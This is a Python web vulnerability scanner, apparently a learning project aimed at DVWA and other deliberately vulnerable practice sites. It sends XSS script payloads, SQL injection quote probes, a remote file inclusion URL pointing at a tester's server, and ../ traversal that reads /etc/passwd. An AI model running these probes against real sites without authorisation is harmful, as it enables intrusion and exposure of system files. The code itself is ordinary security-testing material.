import sys
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup as bSoup

sPy = requests.Session()
sPy.headers[
    "User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

# this for testing the local metasploitable virtual machine box
#
# login_payload = {
#     'username': 'admin',
#     'password': 'password',
#     'Login': 'Login',
# }
# cookies = dict(security='low', PHPSESSID='')
#
# sPy.cookies.update(cookies)
#
# sPy.post('http://172.16.218.131/dvwa/login.php', data=login_payload)


# r = sPy.get('http://192.168.59.128/dvwa/vulnerabilities/fi/?page=include.php')
# print(r.text)

def collectTheForms(url):
    soup = bSoup(sPy.get(url).content, "html.parser")
    return soup.find_all("form")


def detailsOfTheForm(form):
    form_details = {}
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    method = form.attrs.get("method", "get").lower()

    dataInputs = []

    for data_tag in form.find_all("input"):
        form_input_type = data_tag.attrs.get("type", "text")
        nameOfInput = data_tag.attrs.get("name")
        valueOfInput = data_tag.attrs.get("value", "")
        dataInputs.append(
            {"type": form_input_type, "name": nameOfInput, "value": valueOfInput})
    form_details["action"] = action
    form_details["method"] = method
    form_details["inputs"] = dataInputs
    return form_details


def post_a_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])

    theInputs = form_details["inputs"]
    data = {}
    for input in theInputs:

        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        nameOfInput = input.get("name")
        valueOfInput = input.get("value")
        if nameOfInput and valueOfInput:
            data[nameOfInput] = valueOfInput
    if form_details["method"] == "post":
        return sPy.post(target_url, data=data)
    else:

        return sPy.get(target_url, params=data)


def scan_for_xss(url):
    greeting = "-------------------Scanning for XSS---------------------"
    forms = collectTheForms(url)
    returned_form_msg = ""

    testing_script = "<sCriPt>alert('xss')</ScriPt>"

    vulnerable_page = False
    # iterate over all forms
    if len(forms) == 0:
        print("The are no forms in this address")
        return greeting + "\n" + "There are no forms in this address"


    elif len(forms) != 0:
        print("Scanning form(s)...")
        for form in forms:
            form_details = detailsOfTheForm(form)
            page_content = post_a_form(form_details, url, testing_script).content.decode()

            if testing_script in page_content:
                vulnerable_page = True

            if testing_script not in page_content:
                vulnerable_page = False

            if vulnerable_page:
                returned_form_msg = f"Found XSS at this address: {url}\n\nHere is the vulnerable form\n {form_details}"

            if not vulnerable_page:
                returned_form_msg = "Sorry, no XSS was found"

        return greeting + "\n" + returned_form_msg


def vulnerable_errors(response):
    database_errors = {

        "you have an error in your sql syntax",
        "mysql_fetch_array",
        "Warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
    }

    for error in database_errors:
        if error in response.content.decode().lower():
            return True
    return False


def scan_for_sqli(url):
    greeting = "-------------------Scanning for SQLi ------------------ "
    returned_msg = ""
    returned_form_msg = ""
    for t in "'":
        new_url = f"{url}{t}"

        serverResponse = sPy.get(new_url)
        if vulnerable_errors(serverResponse):
            returned_msg = f"A possible SQLi has been found at this address: {url} "

        if not vulnerable_errors(serverResponse):
            returned_msg = "Sorry, there are no SQLis at this url address. "

    forms = collectTheForms(url)
    if len(forms) == 0:
        returned_form_msg = "There are no forms in this address"
        print("There are no forms in this address")

    elif len(forms) != 0:
        for form in forms:
            form_details = detailsOfTheForm(form)
            for x in "'":
                print("Scanning form(s)... ")
                data = {}
                for form_tag in form_details["inputs"]:
                    if form_tag["type"] == "hidden" or form_tag["value"]:
                        try:
                            data[form_tag["name"]] = form_tag["value"] + x
                        except:
                            pass
                    elif form_tag["type"] != "submit":
                        data[form_tag["name"]] = f"test{x}"
                url = urljoin(url, form_details["action"])
                if form_details["method"] == "post":
                    serverResponse = sPy.post(url, data=data)
                elif form_details["method"] == "get":
                    serverResponse = sPy.get(url, params=data)
                if vulnerable_errors(serverResponse):
                    returned_form_msg = f"A possible SQLi has been found in this form: {url} \n Here is the " \
                                        f"vulnerable form: {form_details} "

                if not vulnerable_errors(serverResponse):
                    returned_form_msg = "Sorry, no SQLis have been found in this form"

    return greeting + "\n" + returned_msg + "\n" + "\n" + returned_form_msg


def scan_for_rfi(url):
    greeting = "-------------------Scanning for RFI---------------------"
    grab_address = sPy.get(url)
    print("Target address: " + grab_address.url)
    parsed_address = urlparse(grab_address.url)
    returned_msg = ""
    queryKey = parsed_address.query
    equals_key = "="
    question_key = "?"
    testFile = "testing.php"
    rfi_test_string = "It works!"
    server_address = ""  # change this to your test php server address

    newServerAddress = "http://" + server_address

    if question_key and equals_key in grab_address.url:
        print("Address has a parameter:", queryKey)
        newQuery = queryKey.replace(queryKey, queryKey[0:5])
        query_p1 = "".join(parsed_address[0:1]) + "://"
        query_p2 = "".join(parsed_address[1:2])
        query_p3 = "".join(parsed_address[2:3]) + "?"
        query_p4 = "".join(newQuery)

        attackURL = query_p1 + query_p2 + query_p3 + query_p4 + newServerAddress + "/" + testFile

        results = sPy.get(attackURL)
        theSource = results.content.decode()

        if rfi_test_string in theSource:
            returned_msg = "Remote file accessed successfully"
            print("Remote file accessed successfully")
        else:
            returned_msg = "Sorry, no remote files found"
            # print("Sorry, no remote files found")
            # print(theSource)


    else:
        returned_msg = "No parameters, therefore can't proceed"
        # print("No parameters, therefore can't proceed")
    return greeting + "\n" + returned_msg


def scan_for_lfi(url):
    greeting = "-------------------Scanning for LFI---------------------"
    get_url = sPy.get(url)
    parsed_url = urlparse(get_url.url)
    scriptPath = parsed_url.path
    returned_msg = ""
    theKeyword = parsed_url.query
    param_equals = "="
    param_query = "?"
    param_and = "&"
    depthOfPath = 0
    dir_query = "../"
    max_depth = 10
    i = 1
    findRoot = "root:x:0:0:"
    lookingFor = "etc/passwd"
    theFileDir = "/etc/passwd"
    if len(scriptPath) == 0:
        print("No scripts present in the path")
    else:
        print("Scripts in the path: " + scriptPath)
    if len(theKeyword) == 0:
        print("No keyword queries present in the path")
    else:
        print("The query is: " + theKeyword)
    if param_query and param_equals in url:
        print("1 parameter is present. Searching for extra parameters...")
        if param_and in parsed_url.query and param_equals in parsed_url.query:
            print("More parameters have been found")
        else:
            print("There are no more parameters. Moving on to scanning...")
        newQuery = theKeyword.replace(theKeyword, theKeyword[0:5])
        query_p1 = "".join(parsed_url[0:1]) + "://"
        query_p2 = "".join(parsed_url[1:2])
        query_p3 = "".join(parsed_url[2:3]) + "?"
        query_p4 = "".join(newQuery)
        for depth in range(i, max_depth + 1):

            if depthOfPath == 0:
                query_p4 = "".join(newQuery + (depthOfPath * dir_query) + theFileDir)

            if depthOfPath != 0:
                query_p4 = "".join(newQuery + (depthOfPath * dir_query) + lookingFor)

            finalString = query_p1 + query_p2 + query_p3 + query_p4

            scan_res = sPy.get(finalString)
            res_source = scan_res.content.decode()
            if findRoot in res_source:

                returned_msg = f"It worked! The file was found! \n Address: {scan_res.url}"

                break
            elif findRoot not in res_source:

                depthOfPath = depth
            if depthOfPath == max_depth and findRoot not in res_source:
                returned_msg = "Sorry, no file inclusion found"


    else:
        returned_msg = "No parameters found. Please add parameters, as there is nothing to scan \n Goodbye for now"

    return greeting + "\n" + returned_msg





# if __name__ == "__main__":
    # url = sys.argv[1]
    # testing sites and servers above you can supplement your own
    #
    # testing for sqli and xss
    # url = "http://testphp.vulnweb.com/artists.php?artist=1"
    # url2 = "http://testphp.vulnweb.com/search.php?test=query"
    # url3 = "https://xss-game.appspot.com/level1/frame"
    # url = "http://172.16.218.131/dvwa/vulnerabilities/xss_r/"
    # url = "http://172.16.218.131/dvwa/vulnerabilities/sqli/"
    #
    # scanning for file inclusions
    # url = "http://172.16.218.131/dvwa/vulnerabilities/fi/?page=include.php"
    # print("-------------------Scanning for SQLi ------------------ ")
    # scan_for_sqli(url)
    # scan_for_sqli(url2)
    # scan_for_sqli(url3)
    # print("-------------------Scanning for XSS---------------------")
    # scan_for_xss(url)
    # scan_for_xss(url2)
    # scan_for_xss(url3)
    # print("-------------------Scanning for RFI---------------------")
    # scan_for_rfi(url)
    # print("-------------------Scanning for LFI---------------------")
    # scan_for_lfi(url)
